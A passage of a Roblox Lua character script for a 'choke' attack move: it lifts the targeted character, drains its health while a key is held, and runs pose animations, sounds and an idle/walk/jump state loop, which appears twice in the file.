			local theguy = Mouse.Target.Parent.Parent
			local thehum = theguy:FindFirstChildOfClass("Humanoid")
			   if thehum.Health > 0 then
			    local thehead = theguy:FindFirstChild("Head")
    			local thetor = theguy:FindFirstChild("Torso") or theguy:FindFirstChild("UpperTorso")
    			root.CFrame = CFn(root.CFrame.p, Vector3.new(Mouse.Hit.x, root.CFrame.y, Mouse.Hit.z))
    			thetor.CFrame = CFn(thetor.CFrame.p, Vector3.new(root.CFrame.x, root.CFrame.y, root.CFrame.z))
    			local thetorframe = thetor.CFrame
    			local forpar, forpar2 = Force(larm, CFn(0, 1, 0), thehead, CFn(0, 0.5, 0), theguy)
				if thetor.Anchored == true then
					thetor.Anchored = false
				end
    			local thebv = Instance.new("BodyPosition", thetor)
    			thebv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    			thebv.Position = thetorframe.p
				Sound("rbxassetid://1386781853", 2.5, larm, "OOOWA", false)
    			for i = 0,1,.15 do
    				neck.C1 = clerp(neck.C1, neck1 * CFa(0, 0, Rad(-20)) , i)
    				rootj.C1 = clerp(rootj.C1, rootj1 * CFa(0, 0, Rad(20)), i)
    				LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(20), 0, Rad(90)), i)
    				RS.C1 = clerp(RS.C1, RS1 * CFa(0, Rad(20), 0), i)
    				LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), Rad(-20), 0), i)
    				RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), 0, 0), i)
    				neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
    				rootj.C0 = clerp(rootj.C0, rootj0, i)
    				LS.C0 = clerp(LS.C0, LS0, i)
    				RS.C0 = clerp(RS.C0, RS0, i)
    				LH.C0 = clerp(LH.C0, LH0, i)
    				RH.C0 = clerp(RH.C0, RH0, i)
    				swait()
    			end
    			thebv.Position = thetorframe * CFn(0, 10, 0).p
    			for i = 0,1,.05 do
    				neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(20), 0, Rad(-20)), i)
    				rootj.C1 = clerp(rootj.C1, rootj1 * CFa(0, 0, Rad(20)), i)
    				LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(20), 0, Rad(140)), i)
    				RS.C1 = clerp(RS.C1, RS1 * CFa(0, Rad(20), 0), i)
    				LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), Rad(-20), 0), i)
    				RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), 0, 0), i)
    				neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
    				rootj.C0 = clerp(rootj.C0, rootj0, i)
    				LS.C0 = clerp(LS.C0, LS0, i)
    				RS.C0 = clerp(RS.C0, RS0, i)
    				LH.C0 = clerp(LH.C0, LH0, i)
    				RH.C0 = clerp(RH.C0, RH0, i)
    				swait()
    			end
    			for i = 1,math.huge do
    				if buttonC == true and thehum.Health > 0 then
    					thehum.Health = thehum.Health - 1.5
    					swait()
    				elseif buttonC == false or thehum.Health <= 0 then
    					break
    				end
    			end
    			if thehum.Health <= 0 then
    				Sound("rbxassetid://513153251", 4, thetor, "OUCH", false)
    			end
    			thebv:Destroy()
    			forpar:Destroy()
    			forpar2:Destroy()
			end
		end
		hum.WalkSpeed = nws
		hum.JumpPower = njp
		Choking = false
		attacking = false
	end
end



-----------------------------------------------------------------------------

function kdown(k)
	if k == "e" then
		equipunequip()
	elseif k == "c" then
		if buttonC == false then
			buttonC = true
			Choke()
		end
	end
end

function kup(k)
	if k == "c" then
		if buttonC == true then
			buttonC = false
		end
	end
end

function lmdown()
	Swing()
end

Mouse.KeyDown:connect(kdown)
Mouse.KeyUp:connect(kup)
Mouse.Button1Down:connect(lmdown)

-----------------------------------------------------------------------------

equipunequip()

-----------------------------------------------------------------------------

while true do
	swait()
	sine = sine + 1
	local torvel = (root.Velocity * Vector3.new(1, 0, 1)).magnitude
	if Changing == true then
		state = "Change"
	elseif Swinging == true then
		state = "Swing"
	elseif Choking == true then
		state = "Choking"
	elseif 1 < root.Velocity.y then
		state = "Jump"
	elseif -1 > root.Velocity.y then
		state = "Fall"
	elseif torvel < 1 then
		state = "Idle"
	elseif tor.Velocity.magnitude < 50 then
		state = "Walk"
	end
	
	if state == "Jump" then
		neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(-10), 0, 0), 0.15)
		rootj.C1 = clerp(rootj.C1, rootj1 * CFa(Rad(-10), 0, 0), 0.15)
		LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(10), 0, 0), 0.15)
		RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(10), 0, 0), 0.15)
		LH.C1 = clerp(LH.C1, LH1 * CFn(0.5, -1, -0.1) * CFa(Rad(-10), 0, Rad(-40)), 0.15)
		RH.C1 = clerp(RH.C1, RH1 * CFn(-0.3, -0.8, 0) * CFa(Rad(-5), 0, Rad(15)), 0.15)
		neck.C0 = clerp(neck.C0, neck0, 0.15)
		rootj.C0 = clerp(rootj.C0, rootj0, 0.15)
		LS.C0 = clerp(LS.C0, LS0, 0.15)
		RS.C0 = clerp(RS.C0, RS0, 0.15)
		LH.C0 = clerp(LH.C0, LH0, 0.15)
		RH.C0 = clerp(RH.C0, RH0, 0.15)
	elseif state == "Fall" then
		neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(-5), 0, 0), 0.15)
		rootj.C1 = clerp(rootj.C1, rootj1 * CFa(Rad(10), 0, 0), 0.15)
		LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(20), 0, 0), 0.15)
		RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(20), 0, 0), 0.15)
		LH.C1 = clerp(LH.C1, LH1 * CFn(0.1, -0.4, -0.1) * CFa(Rad(-2), 0, 0), 0.15)
		RH.C1 = clerp(RH.C1, RH1 * CFn(-0.1, -0.4, -0.1) * CFa(Rad(-2), 0, 0), 0.15)
		neck.C0 = clerp(neck.C0, neck0, 0.15)
		rootj.C0 = clerp(rootj.C0, rootj0, 0.15)
		LS.C0 = clerp(LS.C0, LS0, 0.15)
		RS.C0 = clerp(RS.C0, RS0, 0.15)
		LH.C0 = clerp(LH.C0, LH0 * CFa(0, 0, Rad(20)), 0.15)
		RH.C0 = clerp(RH.C0, RH0 * CFa(0, 0, Rad(-20)), 0.15)
	elseif state == "Idle" then
		neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(-7 * Sin(sine / 15)), 0, 0), 0.15)
		rootj.C1 = clerp(rootj.C1, rootj1 * CFn(0, 0, 0.1 * Cos(sine / 15)) * CFa(Rad(-2 * Sin(sine / 15)), 0, 0), 0.15)
		LS.C1 = clerp(LS.C1, LS1 * CFn(0, 0.1 * Cos(sine / 15), 0) * CFa(Rad(5), 0, 0), 0.15)
		RS.C1 = clerp(RS.C1, RS1 * CFn(0, 0.1 * Cos(sine / 15), 0) * CFa(Rad(5), 0, 0), 0.15)
		LH.C1 = clerp(LH.C1, LH1 * CFn(0, -0.1 * Cos(sine / 15), 0) * CFa(Rad(5), 0, Rad(2 * Sin(sine / 15))), 0.15)
		RH.C1 = clerp(RH.C1, RH1 * CFn(0, -0.1 * Cos(sine / 15), 0) * CFa(Rad(5), 0, Rad(-2 * Sin(sine / 15))), 0.15)
		neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(10), 0, 0), 0.15)
		rootj.C0 = clerp(rootj.C0, rootj0 * CFa(Rad(2), 0, 0), 0.15)
		LS.C0 = clerp(LS.C0, LS0, 0.15)
		RS.C0 = clerp(RS.C0, RS0, 0.15)
		LH.C0 = clerp(LH.C0, LH0, 0.15)
		RH.C0 = clerp(RH.C0, RH0, 0.15)
	elseif state == "Walk" then
		neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(-5 * Sin(sine / 4)), 0, 0), 0.15)
		rootj.C1 = clerp(rootj.C1, rootj1 * CFn(0, 0, 0.1 * Cos(sine / 4)) * CFa(Rad(-5), 0, Rad(5 * Sin(sine / 8))), 0.15)
		LS.C1 = clerp(LS.C1, LS1 * CFa(0, 0, Rad(-25 * Sin(sine / 8))), 0.15)
		RS.C1 = clerp(RS.C1, RS1 * CFa(0, 0, Rad(-25 * Sin(sine / 8))), 0.15)
		LH.C1 = clerp(LH.C1, LH1 * CFn(0.15 * Cos(sine / 8), -0.3 * Cos(sine / 8), 0) * CFa(0, 0, Rad(55 * Sin(sine / 8))), 0.15)
		RH.C1 = clerp(RH.C1, RH1 * CFn(0.15 * Cos(sine / 8), 0.3 * Cos(sine / 8), 0) * CFa(0, 0, Rad(55 * Sin(sine / 8))), 0.15)
		neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), 0.15)
		rootj.C0 = clerp(rootj.C0, rootj0, 0.15)
		LS.C0 = clerp(LS.C0, LS0, 0.15)
		RS.C0 = clerp(RS.C0, RS0, 0.15)
		LH.C0 = clerp(LH.C0, LH0 * CFa(0, 0, Rad(20)), 0.15)
		RH.C0 = clerp(RH.C0, RH0 * CFa(0, 0, Rad(-20)), 0.15)
	end
	if not head:FindFirstChild("KOOOHAAA") then
		koohaa = Instance.new("Sound", head)
		koohaa.SoundId = "rbxassetid://149840174"
		koohaa.Name = "KOOOHAAA"
		koohaa.Volume = 2
		koohaa.TimePosition = thepos
		koohaa.Looped = true
		koohaa:Play()
	end
	thepos = koohaa.TimePosition
end
-----------------------------------------------------------------------------

while true do
	swait()
	sine = sine + 1
	local torvel = (root.Velocity * Vector3.new(1, 0, 1)).magnitude
	if Changing == true then
		state = "Change"
	elseif Swinging == true then
		state = "Swing"
	elseif Choking == true then
		state = "Choking"
	elseif 1 < root.Velocity.y then
		state = "Jump"
	elseif -1 > root.Velocity.y then
		state = "Fall"
	elseif torvel < 1 then
		state = "Idle"
	elseif tor.Velocity.magnitude < 50 then
		state = "Walk"
	end
	
	if state == "Jump" then
		neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(-10), 0, 0), 0.15)
		rootj.C1 = clerp(rootj.C1, rootj1 * CFa(Rad(-10), 0, 0), 0.15)
		LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(10), 0, 0), 0.15)
		RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(10), 0, 0), 0.15)
		LH.C1 = clerp(LH.C1, LH1 * CFn(0.5, -1, -0.1) * CFa(Rad(-10), 0, Rad(-40)), 0.15)
		RH.C1 = clerp(RH.C1, RH1 * CFn(-0.3, -0.8, 0) * CFa(Rad(-5), 0, Rad(15)), 0.15)
		neck.C0 = clerp(neck.C0, neck0, 0.15)
		rootj.C0 = clerp(rootj.C0, rootj0, 0.15)
		LS.C0 = clerp(LS.C0, LS0, 0.15)
		RS.C0 = clerp(RS.C0, RS0, 0.15)
		LH.C0 = clerp(LH.C0, LH0, 0.15)
		RH.C0 = clerp(RH.C0, RH0, 0.15)
	elseif state == "Fall" then
		neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(-5), 0, 0), 0.15)
		rootj.C1 = clerp(rootj.C1, rootj1 * CFa(Rad(10), 0, 0), 0.15)
		LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(20), 0, 0), 0.15)
		RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(20), 0, 0), 0.15)
		LH.C1 = clerp(LH.C1, LH1 * CFn(0.1, -0.4, -0.1) * CFa(Rad(-2), 0, 0), 0.15)
		RH.C1 = clerp(RH.C1, RH1 * CFn(-0.1, -0.4, -0.1) * CFa(Rad(-2), 0, 0), 0.15)
		neck.C0 = clerp(neck.C0, neck0, 0.15)
		rootj.C0 = clerp(rootj.C0, rootj0, 0.15)
		LS.C0 = clerp(LS.C0, LS0, 0.15)
		RS.C0 = clerp(RS.C0, RS0, 0.15)
		LH.C0 = clerp(LH.C0, LH0 * CFa(0, 0, Rad(20)), 0.15)
		RH.C0 = clerp(RH.C0, RH0 * CFa(0, 0, Rad(-20)), 0.15)
	elseif state == "Idle" then
		neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(-7 * Sin(sine / 15)), 0, 0), 0.15)
		rootj.C1 = clerp(rootj.C1, rootj1 * CFn(0, 0, 0.1 * Cos(sine / 15)) * CFa(Rad(-2 * Sin(sine / 15)), 0, 0), 0.15)
		LS.C1 = clerp(LS.C1, LS1 * CFn(0, 0.1 * Cos(sine / 15), 0) * CFa(Rad(5), 0, 0), 0.15)
		RS.C1 = clerp(RS.C1, RS1 * CFn(0, 0.1 * Cos(sine / 15), 0) * CFa(Rad(5), 0, 0), 0.15)
		LH.C1 = clerp(LH.C1, LH1 * CFn(0, -0.1 * Cos(sine / 15), 0) * CFa(Rad(5), 0, Rad(2 * Sin(sine / 15))), 0.15)
		RH.C1 = clerp(RH.C1, RH1 * CFn(0, -0.1 * Cos(sine / 15), 0) * CFa(Rad(5), 0, Rad(-2 * Sin(sine / 15))), 0.15)
		neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(10), 0, 0), 0.15)
		rootj.C0 = clerp(rootj.C0, rootj0 * CFa(Rad(2), 0, 0), 0.15)
		LS.C0 = clerp(LS.C0, LS0, 0.15)
		RS.C0 = clerp(RS.C0, RS0, 0.15)
		LH.C0 = clerp(LH.C0, LH0, 0.15)
		RH.C0 = clerp(RH.C0, RH0, 0.15)
	elseif state == "Walk" then
		neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(-5 * Sin(sine / 4)), 0, 0), 0.15)
		rootj.C1 = clerp(rootj.C1, rootj1 * CFn(0, 0, 0.1 * Cos(sine / 4)) * CFa(Rad(-5), 0, Rad(5 * Sin(sine / 8))), 0.15)
		LS.C1 = clerp(LS.C1, LS1 * CFa(0, 0, Rad(-25 * Sin(sine / 8))), 0.15)
		RS.C1 = clerp(RS.C1, RS1 * CFa(0, 0, Rad(-25 * Sin(sine / 8))), 0.15)
		LH.C1 = clerp(LH.C1, LH1 * CFn(0.15 * Cos(sine / 8), -0.3 * Cos(sine / 8), 0) * CFa(0, 0, Rad(55 * Sin(sine / 8))), 0.15)
		RH.C1 = clerp(RH.C1, RH1 * CFn(0.15 * Cos(sine / 8), 0.3 * Cos(sine / 8), 0) * CFa(0, 0, Rad(55 * Sin(sine / 8))), 0.15)
		neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), 0.15)
		rootj.C0 = clerp(rootj.C0, rootj0, 0.15)
		LS.C0 = clerp(LS.C0, LS0, 0.15)
		RS.C0 = clerp(RS.C0, RS0, 0.15)
		LH.C0 = clerp(LH.C0, LH0 * CFa(0, 0, Rad(20)), 0.15)
		RH.C0 = clerp(RH.C0, RH0 * CFa(0, 0, Rad(-20)), 0.15)
	end
	if not head:FindFirstChild("KOOOHAAA") then
		koohaa = Instance.new("Sound", head)
		koohaa.SoundId = "rbxassetid://149840174"
		koohaa.Name = "KOOOHAAA"
		koohaa.Volume = 2
		koohaa.TimePosition = thepos
		koohaa.Looped = true
		koohaa:Play()
	end
	thepos = koohaa.TimePosition
end
